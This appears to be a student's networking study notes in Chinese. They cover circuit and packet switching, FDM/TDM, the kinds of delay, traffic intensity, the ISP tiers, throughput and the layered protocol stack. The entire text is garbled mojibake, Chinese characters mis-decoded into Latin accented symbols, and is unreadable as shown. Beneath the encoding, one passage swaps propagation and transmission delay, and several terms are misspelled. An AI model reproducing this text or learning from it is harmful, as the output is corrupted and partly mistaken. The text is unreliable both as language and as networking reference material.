æ­¤æ¯æ¡é“¾è·¯éƒ½èƒ½æ”¯æŒnæ¡ç”µè·¯åŒæ—¶è¿žæŽ¥.æ¯å°ä¸»æœºéƒ½ä¸Žä¸€å°äº¤æ¢æœºç›¸è¿ž,æ‰€ä»¥è¦é€šä¿¡æ—¶è¯¥ç½‘ç»œä¼šåœ¨ä¸¤å°ä¸»æœºä¹‹é—´å»ºç«‹ç«¯åˆ°ç«¯è¿žæŽ¥.å› æ­¤ä¸€ä¸ªä¸»æœºå‘å¦ä¸€ä¸ªä¸»æœºå‘é€æŠ¥æ–‡,å¿…é¡»åœ¨ä¸¤æ¡é“¾è·¯å€¼ä¸€ä¸Šå…ˆé¢„ç•™ä¸€æ¡ç”µè·¯. é“¾è·¯ä¸­çš„ç”µè·¯è¦ä¹ˆé€šè¿‡é¢‘åˆ†å¤šè·¯å¤ç”¨(Frequency-Division Multiplexing,FDM)å®žçŽ°,è¦ä¹ˆé€šè¿‡æ—¶åˆ†å¤šè·¯å¤ç”¨(Time-Division Multiplexing,TDM)å®žçŽ°. å¯¹äºŽFDM,é“¾è·¯çš„é¢‘è°±ç”±è·¨è¶Šé“¾è·¯åˆ›å»ºçš„æ‰€æœ‰è¿žæŽ¥å…±äº«.è¯¥é“¾è·¯åœ¨è¿žæŽ¥æœŸé—´ä¸ºæ¯æ¡è¿žæŽ¥ä¸“ç”¨ä¸€ä¸ªé¢‘æ®µ.åœ¨ç”µè¯ç½‘ç»œä¸­,è¿™ä¸ªé¢‘æ®µé€šå¸¸æœ‰4kHZ.è¯¥é¢‘æ®µåœ°å®½åº¦è¢«ç§°ä¸ºå¸¦å®½(bandwith).ä¾‹å¦‚è°ƒé¢‘æ— çº¿ç”µå°ä½¿ç”¨FDMæ¥å…±äº«88-108MHZçš„é¢‘è°±,å…¶ä¸­æ¯ä¸ªç”µå°è¢«åˆ†é…ä¸€ä¸ªç‰¹å®šçš„é¢‘å¸¦. å¯¹äºŽTDMé“¾è·¯,æ—¶é—´è¢«åˆ’åˆ†ä¸ºå›ºå®šåŒºé—´çš„å¸§,æ¯å¸§åˆ’åˆ†ä¸ºå›ºå®šæ•°é‡çš„æ—¶éš™.å½“ç½‘ç»œè·¨è¶Šä¸€æ¡é“¾è·¯åˆ›å»ºè¿žæŽ¥æ—¶,è¯¥ç½‘ç»œåœ¨æ¯ä¸ªå¸§ä¸­ä¸ºè¯¥è¿žæŽ¥æŒ‡å®šä¸€ä¸ªæ—¶éš™.è¿™äº›æ—¶éš™ä¸“é—¨ç”±è¯¥è¿žæŽ¥å•ç‹¬ä½¿ç”¨,ä¸€ä¸ªæ—¶éš™å¯ç”¨äºŽä¼ è¾“è¯¥è¿žæŽ¥åœ¨æ¯ä¸ªå¸§å†…çš„æ•°æ®.ä¸€æ¡ç”µè·¯çš„ä¼ è¾“é€ŸçŽ‡ç­‰äºŽä¸€ä¸ªæ—¶éš™ä¸­çš„æ¯”ç‰¹æ•°ä¹˜ä»¥è¯¥å¸§çš„é€ŸçŽ‡. ![](D:\My Daily\P\QQå›¾ç‰‡20200723195929.png) ä¼ è¾“æ—¶é—´ä¸Žé“¾è·¯æ•°ç›®æ— å…³,å› ä¸ºåªç”¨æŒ‡å®šçš„é“¾è·¯è¿›è¡Œä¼ è¾“. å„ç§åº”ç”¨ç¨‹åºåœ¨å®Œæˆå…¶ä»»åŠ¡æ—¶è¦äº¤æ¢æŠ¥æ–‡,æŠ¥æ–‡èƒ½å¤ŸåŒ…å«åè®®è®¾è®¡è€…éœ€è¦çš„ä»»ä½•ä¸œè¥¿,èƒ½å¤ŸåŒ…å«æ•°æ®/æŽ§åˆ¶åŠŸèƒ½.çŽ°ä»£è®¡ç®—æœºç½‘ç»œä¸­,æºä¸»æœºå°†é•¿æŠ¥æ–‡åˆ’åˆ†ä¸ºè¾ƒå°çš„æ•°æ®å—å¹¶ç§°ä¹‹ä¸ºåˆ†ç»„.è¿™äº›åˆ†ç»„åœ¨æºä¸Žç›®çš„åœ°ä¹‹é—´é€šè¿‡é€šä¿¡é“¾è·¯ä¸Žåˆ†ç»„äº¤æ¢æœºä¼ é€.åˆ†ç»„ä»¥è¯¥é“¾è·¯æœ€å¤§é€ŸçŽ‡åœ¨é€šä¿¡é“¾è·¯ä¸Šä¼ è¾“. ä¼ è¾“æ—¶å»¶/å­˜å‚¨è½¬å‘æ—¶å»¶:å¤šæ•°åˆ†ç»„äº¤æ¢æœºåœ¨é“¾è·¯çš„è¾“å…¥ç«¯ä½¿ç”¨å­˜å‚¨è½¬å‘ä¼ è¾“æœºåˆ¶,å³åœ¨äº¤æ¢æœºå¼€å§‹å‘é“¾è·¯ä¼ è¾“ç¬¬ä¸€ä¸ªæ¯”ç‰¹ä¹‹å‰,è¦å…ˆæŽ¥æ”¶åˆ°æ‰€æœ‰çš„åˆ†ç»„. ä¸»æœº-é“¾è·¯-äº¤æ¢æœºâ€”äº¤æ¢æœº-é“¾è·¯-ä¸»æœº å­˜å‚¨è½¬å‘æ—¶å»¶å°±æŒ‡çš„æ˜¯äº¤æ¢æœºå¾—åˆ°ç¬¬ä¸€ä¸ªæ¯”ç‰¹åˆ°æœ€åŽä¸€ä¸ªæ¯”ç‰¹çš„æ—¶é—´.åœ¨næ®µé“¾è·¯ä¸­ä¸€å…±è¦å­˜å‚¨å’Œè½¬å‘n-1æ¬¡,åŠ ä¸Šä¸»æœºåˆ°äº¤æ¢æœºçš„ä¸€æ¬¡,å…±næ¬¡. æŽ’é˜Ÿæ—¶å»¶:æ¯ä¸ªåˆ†ç»„äº¤æ¢æœºæœ‰å¤šæ¡é“¾è·¯ä¸Žä¹‹ç›¸è¿ž,å¯¹äºŽæ¯æ¡é“¾è·¯è¯¥äº¤æ¢æœºéƒ½æœ‰ä¸€ä¸ªè¾“å‡ºç¼“å­˜output buffer,ç”¨äºŽå­˜å‚¨è·¯ç”±å™¨å‡†å¤‡å‘å¾€çš„é‚£æ¡é“¾è·¯çš„åˆ†ç»„.å¦‚æžœåˆ°è¾¾çš„åˆ†ç»„éœ€è¦è·¨è¶Šé“¾è·¯ä¼ è¾“,ä½†æ˜¯è¯¥é“¾è·¯æ­£å¿™äºŽå…¶ä»–åˆ†ç»„,åˆ™è¯¥åˆ†ç»„éœ€åœ¨è¾“å‡ºç¼“å­˜ä¸­ç­‰å¾….å› æ­¤æ­¤å¤„å­˜åœ¨æŽ’é˜Ÿæ—¶å»¶.æŽ’é˜Ÿæ—¶å»¶æ ¹æ®ç½‘ç»œçš„æƒ…å†µè€Œå®š.*å¦‚æžœç­‰å¾…ä¼ è¾“çš„åˆ†ç»„å·²ç»æ»¡äº†,åˆ™å°†å‡ºçŽ°åˆ†ç»„ä¸¢å¤±/ä¸¢åŒ…,å¯èƒ½æ˜¯åˆšåˆšåˆ°è¾¾çš„åˆ†ç»„ä¹Ÿå¯èƒ½æ˜¯æ­£åœ¨æŽ’é˜Ÿçš„åˆ†ç»„è´¨ç–‘è¢«ä¸¢å¼ƒ. * ç”µè·¯äº¤æ¢ä¸è€ƒè™‘éœ€æ±‚è€Œé¢„å…ˆåˆ†é…ä¼ è¾“é“¾è·¯çš„ä½¿ç”¨,è¿™ä½¿å¾—å·²ç»åˆ†é…ä½†æ˜¯ä¸éœ€è¦çš„é“¾è·¯æœªè¢«åˆ©ç”¨.è€Œåˆ†ç»„äº¤æ¢æŒ‰éœ€åˆ†é….é“¾è·¯ä¼ è¾“èƒ½åŠ›åªåˆ†é…ç»™æœ‰éœ€æ±‚çš„ç”¨æˆ·,è¿™æ ·çš„æŒ‰éœ€å…±äº«èµ„æºæœ‰æ—¶è¢«ç§°ä¸ºèµ„æºçš„ç»Ÿè®¡å¤šè·¯å¤ç”¨. 1.3.2åˆ†ç»„æ˜¯æ€Žæ ·é€šè¿‡åˆ†ç»„äº¤æ¢å½¢æˆå…¶ç½‘ç»œçš„åˆ†ç»„äº¤æ¢æœºæ˜¯å¦‚ä½•ç¡®å®šåˆ†ç»„ä¸Žé“¾è·¯ä¹‹é—´çš„å¯¹åº”å…³ç³»çš„?åœ¨å› ç‰¹ç½‘ä¸­,æ¯ä¸ªé€šè¿‡ç½‘ç»œä¼ è¾“çš„åˆ†ç»„åœ¨å…¶é¦–éƒ¨éƒ½åŒ…å«äº†å…¶ç›®çš„åœ°å€.è¯¥åœ°å€æ˜¯ä¸€ç§å±‚æ¬¡ç»“æž„,å½“åˆ†ç»„åˆ°è¾¾ç½‘ç»œä¸­çš„ä¸€å°è·¯ç”±å™¨æ—¶,è¯¥è·¯ç”±å™¨æ£€æŸ¥åœ°å€çš„ä¸€éƒ¨åˆ†å¹¶ç»§ç»­è½¬å‘.æ¯å°è·¯ç”±å™¨éƒ½æœ‰ä¸€ä¸ªè½¬å‘è¡¨,ç”¨äºŽå°†ç›®çš„åœ°å€ä¸Žé“¾è·¯ä¸€ä¸€æ˜ å°„.åˆ†ç»„åˆ°è¾¾ä¹‹åŽ,æœç´¢,ç¡®å®šé“¾è·¯,è½¬å‘. è½¬å‘è¡¨çš„è®¾ç½®:å› ç‰¹ç½‘æœ‰ä¸€äº›ç‰¹æ®Šçš„é€‰è·¯åè®®,å®ƒä»¬ç”¨äºŽè‡ªåŠ¨åœ°è®¾ç½®è½¬å‘è¡¨(forwarding table).ä¾‹å¦‚é€‰å½•åè®®å¯ä»¥å†³å®šä»Žæ¯å°è·¯ç”±å™¨åˆ°æ¯ä¸ªç›®çš„åœ°çš„æœ€çŸ­è·¯å¾„,å¹¶ä½¿ç”¨è¿™äº›æœ€çŸ­è·¯å¾„æ¥é…ç½®è·¯ç”±å™¨ä¸­çš„è½¬å‘è¡¨. 1.3.3ISPå’Œå› ç‰¹ç½‘ä¸»å¹² å› ç‰¹ç½‘æ˜¯ç½‘ç»œçš„ç½‘ç»œ åœ¨å…¬å…±å› ç‰¹ç½‘ä¸­,åè½åœ¨å› ç‰¹ç½‘è¾¹ç¼˜çš„æŽ¥å…¥ç½‘ç»œé€šè¿‡åˆ†å±‚çš„ISPå±‚æ¬¡ç»“æž„ä¸Žå› ç‰¹ç½‘çš„å…¶ä»–éƒ¨åˆ†ç›¸è¿ž.æŽ¥å…¥ISPä¸€èˆ¬ä½äºŽè¯¥å±‚æ¬¡ç»“æž„åº•éƒ¨.è¯¥å±‚æ¬¡ç»“æž„çš„æœ€é¡¶å±‚æ˜¯æ•°é‡ç›¸å¯¹è¾ƒå°‘çš„ç¬¬ä¸€å±‚ISP. ç¬¬ä¸€å±‚ISPç‰¹æ€§: ç›´æŽ¥ä¸Žå…¶ä»–æ¯ä¸€ä¸ªç¬¬ä¸€å±‚ISPç›¸è¿ž; ä¸Žå¤§é‡çš„ç¬¬äºŒå±‚ISPå’Œå…¶ä»–å®¢æˆ·ç½‘ç»œç›¸è¿ž; è¦†ç›–å›½é™…åŒºåŸŸ; ç¬¬ä¸€å±‚ISPä¹Ÿè¢«ç§°ä½œå› ç‰¹ç½‘ä¸»å¹²(Internet backbone); ç¬¬äºŒå±‚ISPé€šå¸¸å…·æœ‰åŒºåŸŸæ€§æˆ–å›½å®¶æ€§çš„è¦†ç›–è§„æ¨¡,å¹¶ä¸”éžå¸¸é‡è¦åœ°ä»…ä¸Žå°‘æ•°ç¬¬ä¸€å±‚ISPç›¸è¿žæŽ¥.å› æ­¤ä¸ºäº†åˆ°è¾¾å…¨çƒå› ç‰¹ç½‘çš„å¤§éƒ¨åˆ†åŒºåŸŸ,ç¬¬äºŒæ¬¡ISPçš„æµé‡éœ€è¦è­¦å‘Šç¬¬ä¸€å±‚ISP.ç¬¬äºŒæ¬¡ISPè¢«ç§°ä½œå®ƒæ‰€è¿žæŽ¥çš„ç¬¬ä¸€å±‚ISPçš„å®¢æˆ·.ä¸€ä¸ªç¬¬äºŒå±‚ç½‘ç»œä¹Ÿå¯ä»¥é€‰æ‹©ä¸Žå…¶ä»–ç¬¬äºŒå±‚ç½‘ç»œç›¸è¿ž,è¿™ç§æƒ…å†µä¸‹æµé‡ä¸ç»è¿‡ç¬¬ä¸€å±‚ISPè€Œç›´æŽ¥æµåŠ¨.åœ¨ç¬¬äºŒå±‚ä¹‹ä¸‹æ˜¯è¾ƒä½Žå±‚ISP,ç»è¿‡ä¸€ä¸ªæˆ–å¤šä¸ªç¬¬äºŒå±‚ISPä¸Žæ›´å¤§çš„å› ç‰¹ç½‘ç›¸è¿ž.å½“ä¸¤ä¸ªISPå½¼æ­¤ç›´æŽ¥ç›¸è¿ž,å®ƒä»¬æ˜¯å¯¹ç­‰çš„peer. åœ¨ä¸€ä¸ªISPç½‘ç»œä¸­,æŸISPä¸Žå…¶ä»–ISPçš„è¿žæŽ¥ç‚¹ä¸ºæ±‡é›†ç‚¹(Point of Presence).POPå°±æ˜¯æŸISPç½‘ç»œä¸­çš„ä¸€å°/å¤šå°è·¯ç”±å™¨ç»„,é€šè¿‡å®ƒä»¬èƒ½å¤Ÿä¸Žå…¶ä»–ISPçš„è·¯ç”±å™¨è¿žæŽ¥. ä¸¤ä¸ªç¬¬ä¸€å±‚ISPå¯ä»¥å°†ä¸€å¯¹POPè¿žåœ¨ä¸€èµ·,å½¢æˆå½¼æ­¤å¯¹ç­‰,è¿™ä¸€å¯¹POPçš„æ¯ç«¯åˆ†å±žè¿™ä¸¤ä¸ªISPä¹‹ä¸€.æ­¤å¤–ä¸¤ä¸ªISPå¯ä»¥å…·æœ‰å¤šä¸ªå¯¹ç­‰ç‚¹,å°†ä¸¤ä¸ªæˆ–æ›´å¤šPOPå¯¹å½¼æ­¤ç›¸è¿ž. 1.4åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶,ä¸¢åŒ…å’Œåžåé‡1.4.1åˆ†ç»„äº¤æ¢ç½‘ä¸­çš„æ—¶å»¶æ¦‚è¿°èŠ‚ç‚¹å¤„ç†æ—¶å»¶(nodal processing delay),æŽ’é˜Ÿæ—¶å»¶(queuing delay),ä¼ è¾“æ—¶å»¶(transmission delay)å’Œä¼ æ’­æ—¶å»¶(propagation delay),è¿™äº›æ—¶å»¶åŠ èµ·æ¥å°±æ˜¯èŠ‚ç‚¹æ€»æ—¶å»¶(total nodal delay). å¤„ç†æ—¶å»¶:æ£€æŸ¥åˆ†ç»„é¦–éƒ¨å’Œå†³å®šå°†è¯¥åˆ†ç»„å¯¼å‘ä½•å¤„æ‰€éœ€è¦çš„æ—¶é—´æ˜¯å¤„ç†æ—¶å»¶çš„ä¸€éƒ¨åˆ†.åŒæ—¶å¤„ç†æ—¶å»¶ä¹ŸåŒ…æ‹¬å…¶ä»–å› ç´ ,æ¯”å¦‚æ£€æŸ¥æ¯”ç‰¹çº§å·®é”™æ‰€éœ€è¦çš„æ—¶é—´. æŽ’é˜Ÿæ—¶å»¶:åœ¨é˜Ÿåˆ—ä¸­,åˆ†ç»„åœ¨é“¾è·¯ä¸Šç­‰å¾…ä¼ è¾“æ—¶,ç»å—æŽ’é˜Ÿæ—¶å»¶.å–å†³äºŽç½‘ç»œçŠ¶æ€(æ˜¯å¦æœ‰å…¶ä»–åˆ†ç»„æŽ’é˜Ÿç­‰). ä¼ è¾“æ—¶å»¶:ä»…å½“æ‰€æœ‰å·²ç»åˆ°è¾¾çš„åˆ†ç»„è¢«ä¼ è¾“ä¹‹åŽ,æ‰èƒ½å¼€å§‹å¯¹åˆ†ç»„è¿›è¡Œä¼ è¾“.å³å°†æ‰€æœ‰åˆ†ç»„æŽ¨å‘é“¾è·¯éœ€è¦çš„æ—¶é—´. ä¼ æ’­æ—¶å»¶:ä¸€ä¸ªæ¯”ç‰¹è¢«æŽ¨å‘é“¾è·¯,å¼€å§‹å‘Bä¼ æ’­.ç”±è¯¥é“¾è·¯èµ·ç‚¹åˆ°è·¯ç”±å™¨Bä¼ æ’­æ‰€éœ€è¦çš„æ—¶é—´ä¸ºä¼ æ’­æ—¶å»¶.æ˜¾è€Œæ˜“è§,ä¼ æ’­æ—¶å»¶ç­‰äºŽä¸¤å°è·¯ç”±å™¨ä¹‹é—´çš„é“¾è·¯è·ç¦»é™¤ä»¥ä¼ æ’­é€ŸçŽ‡. ðŸŽˆä¼ æ’­æ—¶å»¶æ˜¯è·¯ç”±å™¨å°†åˆ†ç»„æŽ¨å‡ºæ‰€éœ€è¦çš„æ—¶é—´,æ˜¯åˆ†ç»„é•¿åº¦å’Œé“¾è·¯ä¼ è¾“é€ŸçŽ‡çš„å‡½æ•°,è€Œä¸Žä¸¤å°è·¯ç”±å™¨ä¹‹é—´çš„è·ç¦»æ— å…³.ä¼ æ’­æ—¶å»¶æ˜¯ä¸€ä¸ªæ¯”ç‰¹ä»Žè·¯ç”±å™¨Aåˆ°Bä¼ æ’­æ‰€éœ€çš„æ—¶é—´,æ˜¯è·¯ç”±å™¨ä¹‹é—´è·ç¦»çš„å‡½æ•°,ä¸Žåˆ†ç»„é•¿åº¦/é“¾è·¯ä¼ è¾“é€ŸçŽ‡(ä¸æ˜¯ä¼ æ’­é€ŸçŽ‡)æ— å…³. 1.4.2æŽ’é˜Ÿæ—¶å»¶å’Œä¸¢åŒ…æŽ’é˜Ÿæ—¶å»¶å¯¹äºŽä¸åŒçš„åˆ†ç»„æ˜¯ä¸åŒçš„.eg:10ä¸ªåˆ†ç»„åˆ°è¾¾ç©ºé˜Ÿåˆ—,ç¬¬ä¸€ä¸ªåˆ†ç»„çš„æŽ’é˜Ÿæ—¶å»¶ä¸º0,ç¬¬åä¸ªåˆ™æœ€å¤§. æŽ’é˜Ÿæ—¶å»¶çš„å¤§å°å–å†³äºŽæµé‡åˆ°è¾¾è¯¥é˜Ÿåˆ—çš„é€ŸçŽ‡,é“¾è·¯ä¼ è¾“é€ŸçŽ‡å’Œåˆ°è¾¾æµé‡çš„æ€§è´¨(å‘¨æœŸæ€§/çªå‘æ€§).aè¡¨ç¤ºåˆ†ç»„åˆ°è¾¾é˜Ÿåˆ—çš„å¹³å‡é€ŸçŽ‡,pkt/s.Rä¸ºä¼ è¾“é€ŸçŽ‡,æ¯”ç‰¹ä»Žé˜Ÿåˆ—ä¸­æŽ¨å‡ºçš„é€ŸçŽ‡,bps.å‡è®¾æ‰€æœ‰åˆ†ç»„ç”±Læ¯”ç‰¹æž„æˆ,åˆ™La/Rè¢«ç§°ä½œæµé‡å¼ºåº¦(traffic intensity),åœ¨ä¼°è®¡æŽ’é˜Ÿæ—¶å»¶çš„å½±å“ç¨‹åº¦æ–¹é¢æœ‰å¾ˆé‡è¦ä½œç”¨.æµé‡å¼ºåº¦å¤§äºŽ1,é˜Ÿåˆ—çš„å¢žåŠ è¶‹äºŽæ— ç•Œ.æ‰€ä»¥åœ¨æµé‡å·¥ç¨‹ä¸­,è®¾è®¡ç³»ç»Ÿæ—¶çš„æµé‡å¼ºåº¦ä¸èƒ½å¤§äºŽ1. æµé‡å¼ºåº¦å°äºŽ1æ—¶,æ˜¾è€Œæ˜“è§å½±å“æŽ’é˜Ÿæ—¶å»¶çš„å°±æ˜¯æµé‡æ€§è´¨.ç¬¬nä¸ªä¼ è¾“çš„åˆ†ç»„æœ‰(n-1)L/Rsçš„æŽ’é˜Ÿæ—¶å»¶. åœ¨å®žé™…ç”Ÿæ´»ä¸­,æµé‡å¼ºåº¦ä¸Žå¹³å‡æŽ’é˜Ÿæ—¶å»¶çš„å‡½æ•°å›¾åƒæ˜¯å‘ä¸Šå¼€å£äºŒæ¬¡å‡½æ•°çš„å³åŠè¾¹.éšç€æµé‡å¼ºåº¦è¶‹è¿‘äºŽ1,å¹³å‡æŽ’é˜Ÿæ—¶å»¶å¤§å¤§å¢žåŠ .æµé‡å¼ºåº¦çš„å°‘é‡å¢žåŠ ä¹Ÿä¼šå¯¼è‡´æ—¶å»¶çš„å¤§é‡å¢žåŠ .æŽ’é˜Ÿçš„å®¹é‡æ˜¯æœ‰é™çš„,æ‰€ä»¥æµé‡å¼ºåº¦æŽ¥è¿‘äºŽ1çš„æ—¶å€™,æŽ’é˜Ÿæ—¶å»¶ä¸ä¼šè¶‹å‘æ— ç©·å¤§.åˆ°è¾¾çš„åˆ†ç»„å‘çŽ°æ˜¯ä¸€ä¸ªæ»¡çš„é˜Ÿåˆ—,åˆ™æ— å¤„å®‰æ”¾,è·¯ç”±å™¨å°†ä¸¢å¼ƒè¿™ä¸ªåˆ†ç»„.èŠ‚ç‚¹çš„æ€§èƒ½ä¸ä»…è¦æ ¹æ®æ—¶å»¶æ¥è¡¡é‡,è€Œä¸”è¦æ ¹æ®åˆ†ç»„ä¸¢å¤±çš„æ¦‚çŽ‡è¡¡é‡. 1.4.3ç«¯åˆ°ç«¯æ—¶å»¶æ‹¨å·è°ƒåˆ¶è§£è°ƒå™¨å¼•å…¥çš„è°ƒåˆ¶/ç¼–ç æ—¶å»¶,åª’ä½“åˆ†ç»„åŒ–æ—¶å»¶. 1.4.4è®¡ç®—æœºç½‘ç»œä¸­çš„åžåé‡è®¡ç®—æœºç½‘ç»œä¸­è¿˜æœ‰ä¸€é¢—æ€§èƒ½æµ‹åº¦æ˜¯ç«¯åˆ°ç«¯åžåé‡.çž¬é—´åžåé‡instantaneous throughoutä¸Žå¹³å‡åžåé‡average throughout. æœåŠ¡å™¨-é“¾è·¯-è·¯ç”±å™¨-é“¾è·¯-ä¸»æœº;è¿™ç§ç®€å•çš„ä¸¤é“¾è·¯ç½‘ç»œ,å…¶åžåé‡æ˜¯min{Rc,Rs}(Rc=è·¯ç”±å™¨ä¸Žå®¢æˆ·æœºä¹‹é—´çš„é“¾è·¯é€ŸçŽ‡,Rs=æœåŠ¡å™¨ä¸Žè·¯ç”±å™¨ä¹‹é—´çš„é“¾è·¯é€ŸçŽ‡)=ç“¶é¢ˆé“¾è·¯(bottleneck link)çš„ä¼ è¾“é€ŸçŽ‡. è®¡ç®—æœºç½‘ç»œçš„æ ¸å¿ƒå°±åƒæ˜¯ä¸€ä¸ªå®½å¤§çš„ç®¡å­,æ‰€ä»¥æ¯”ç‰¹ä»Žæºå‘ç›®çš„åœ°æµåŠ¨é€ŸçŽ‡æ˜¯Rcä¸ŽRsçš„è¾ƒå°è€….ç›®å‰å› ç‰¹ç½‘ä¸­å¯¹åžåé‡çš„é™åˆ¶å› ç´ é€šå¸¸æ˜¯æŽ¥å…¥ç½‘. åžåé‡ä¸ä»…å–å†³äºŽæ²¿ç€è·¯å¾„çš„ä¼ è¾“é€ŸçŽ‡,è€Œä¸”å–å†³äºŽå¹²æ‰°æµé‡.(è®¸å¤šæ•°æ®æµéƒ½é€šè¿‡ä¸€æ¡é“¾è·¯æµåŠ¨,å³ä½¿è¿™æ¡é“¾è·¯å…·æœ‰é«˜ä¼ è¾“é€ŸçŽ‡,ä¹Ÿå¯èƒ½æˆä¸ºæ–‡ä»¶ä¼ è¾“çš„ç“¶é¢ˆé“¾è·¯. 1.5åè®®å±‚æ¬¡å’Œå®ƒä»¬çš„æœåŠ¡æ¨¡åž‹1.5.1åˆ†å±‚çš„ä½“ç³»ç»“æž„ç½‘ç»œè®¾è®¡è€…ä»¥åˆ†å±‚çš„æ–¹å¼ç»„ç»‡åè®®,ä»¥åŠå®žçŽ°è¿™äº›åè®®çš„ç½‘ç»œç¡¬ä»¶ä¸Žè½¯ä»¶.æ¯ä¸ªåè®®å±žäºŽä¸€å±‚.æ¯å±‚é€šè¿‡åœ¨è¯¥å±‚ä¸­æ‰§è¡ŒæŸäº›åŠ¨ä½œ,æˆ–ç›´æŽ¥ä½¿ç”¨ä¸‹å±‚çš„æœåŠ¡,æ¥æä¾›å…¶æœåŠ¡. ä¸€ä¸ªåè®®å±‚èƒ½å¤Ÿç”¨è½¯ä»¶/ç¡¬ä»¶æˆ–ä¸¤è€…ç»“åˆçš„æ–¹å¼æ¥å®žçŽ°,HTTP/SMTPç­‰åº”ç”¨å±‚åè®®é€šå¸¸æ˜¯åœ¨ç«¯ç³»ç»Ÿä¸­ç”¨è½¯ä»¶å®žçŽ°çš„,è¿è¾“å±‚åè®®ä¹Ÿæ˜¯å¦‚æ­¤.ç½‘ç»œå±‚é€šå¸¸æ˜¯ç¡¬ä»¶å’Œè½¯ä»¶çš„æ··åˆä½“.å› ä¸ºç‰©ç†å±‚å’Œæ•°æ®é“¾è·¯å±‚è´Ÿè´£å¤„ç†è·¨ç‰¹å®šé“¾è·¯çš„é€šä¿¡,å®ƒä»¬é€šå¸¸åœ¨ä¸Žç»™å®šé“¾è·¯ç›¸å…³çš„ç½‘ç»œæŽ¥å£å¡ä¸­å®žçŽ°.å±‚nåè®®ä¹Ÿåˆ†å¸ƒåœ¨æž„æˆè¯¥ç½‘ç»œçš„ç«¯ç³»ç»Ÿ,åˆ†ç»„äº¤æ¢æœºå’Œå…¶ä»–ç»„ä»¶ä¸­,å³å±‚nåè®®çš„ä¸åŒéƒ¨åˆ†å¸¸å¸¸ä½äºŽè¿™äº›ç½‘ç»œç»„ä»¶çš„å„éƒ¨åˆ†ä¸­. å„å±‚çš„æ‰€æœ‰åè®®è¢«ç§°ä½œåè®®æ ˆprotocol stack; åº”ç”¨å±‚æ˜¯ç½‘ç»œåº”ç”¨ç¨‹åºåŠå…¶åº”ç”¨å±‚åè®®ç•™å­˜çš„åœ°æ–¹,HTTP/SMTP/FTP/DNS,åˆ›å»ºå¹¶éƒ¨ç½²è‡ªå·±çš„æ–°åº”ç”¨å±‚åè®®æ˜¯éžå¸¸å®¹æ˜“çš„.åº”ç”¨å±‚åˆ†å¸ƒåœ¨å¤šä¸ªç«¯ç³»ç»Ÿä¸Š,ä¸€ä¸ªçŸ­æ¯ç”¨ä¸­çš„åº”ç”¨ç¨‹åºä½¿ç”¨åè®®ä¸Žå¦ä¸€ä¸ªç«¯ç³»ç»Ÿä¸­çš„åº”ç”¨ç¨‹åºäº¤æ¢ä¿¡æ¯åˆ†ç»„.æˆ‘ä»¬å°†è¿™ç§ä½äºŽåº”ç”¨å±‚çš„ä¿¡æ¯åˆ†ç»„ç§°ä¹‹ä¸ºæŠ¥æ–‡message. è¿è¾“å±‚æä¾›äº†åœ¨åº”ç”¨ç¨‹åºç«¯ç‚¹ä¹‹é—´ä¼ è¾“åº”ç”¨å±‚æŠ¥æ–‡çš„æœåŠ¡.æœ‰UDP/TCPä¸¤ä¸ªè¿è¾“å±‚åè®®.å‰è€…å‘å®ƒçš„åº”ç”¨ç¨‹åºæä¾›æ— è¿žæŽ¥æœåŠ¡,æ˜¯ä¸€ç§ä¸æä¾›ä¸å¿…è¦æœåŠ¡çš„æœåŠ¡,ä¸æä¾›å¯é æ€§,æ— æµé‡æŽ§åˆ¶ä¸Žæ‹¥å¡žæŽ§åˆ¶.åŽè€…å‘å®ƒçš„åº”ç”¨ç¨‹åºæä¾›é¢å‘è¿žæŽ¥çš„æœåŠ¡,åŒ…æ‹¬äº†åº”ç”¨å±‚æŠ¥æ–‡å‘ç›®çš„åœ°ç¡®ä¿ä¼ é€’å’Œæµé‡æŽ§åˆ¶(å‘é€æ–¹æŽ¥æ”¶æ–¹é€ŸçŽ‡åŒ¹é…).å¹¶å°†é•¿ä¿æ¸©åˆ’åˆ†ä¸ºçŸ­æŠ¥æ–‡,å¹¶æä¾›æ‹¥å¡žæŽ§åˆ¶:å½“ç½‘ç»œé˜»å¡žæ—¶,æºæŠ‘åˆ¶å…¶ä¼ è¾“é€ŸçŽ‡.è¿è¾“å±‚åˆ†ç»„æˆä¸ºæŠ¥æ–‡æ®µsegment. ç½‘ç»œå±‚è´Ÿè´£å°†ç§°ä¸ºæ•°æ®æŠ¥datagramçš„ç½‘ç»œå±‚åˆ†ç»„ä»Žä¸€å°ä¸»æœºç§»åŠ¨åˆ°å¦ä¸€å°ä¸»æœº.æºä¸»æœºä¸­çš„è¿è¾“å±‚åè®®å‘ç½‘ç»œå±‚æäº¤æŠ¥æ–‡æ®µä¸Žç›®çš„åœ°å€.ç½‘ç»œå±‚åŒ…æ‹¬IPåè®®,ä¸Žå†³å®šè·¯ç”±çš„é€‰å½•åè®®,æ•°æ®æŠ¥æ ¹æ®è¯¥è·¯ç”±ä»Žæºä¼ è¾“åˆ°ç›®çš„åœ°. é“¾è·¯å±‚åˆ†ç»„ç§°ä¸ºå¸§frame.é“¾è·¯å±‚æä¾›çš„æœåŠ¡å–å†³äºŽåº”ç”¨äºŽè¯¥é“¾è·¯çš„ç‰¹å®šé“¾è·¯å±‚åè®®.æ•°æ®æŠ¥ä»Žæºåˆ°ç›®çš„åœ°ä¼ é€é€šå¸¸éœ€è¦ç»è¿‡å‡ æ¡é“¾è·¯,æ‰€ä»¥å®ƒå¯èƒ½è¢«æ²¿é€”ä¸åŒé“¾è·¯ä¸Šçš„ä¸åŒé“¾è·¯å±‚åè®®å¤„ç†. é“¾è·¯å±‚çš„ä»»åŠ¡æ˜¯å°†æ•´ä¸ªå¸§ä»Žä¸€ä¸ªç½‘æ ¼å…ƒç´ ç§»åŠ¨åˆ°é‚»è¿‘çš„ç½‘æ ¼å…ƒç´ ,ç‰©ç†å±‚çš„ä»»åŠ¡æ˜¯å°†è¯¥å¸§ä¸­çš„ä¸€ä¸ªä¸€ä¸ªæ¯”ç‰¹ä»Žä¸€ä¸ªèŠ‚ç‚¹ç§»åŠ¨åˆ°ä¸‹ä¸€ä¸ªèŠ‚ç‚¹.è¯¥å±‚çš„åè®®ä»ç„¶æ˜¯é“¾è·¯ç›¸å…³çš„,å¹¶ä¸”è¿›ä¸€æ­¥ä¸Žé“¾è·¯çš„å®žé™…ä¼ è¾“åª’ä½“ç›¸å…³. 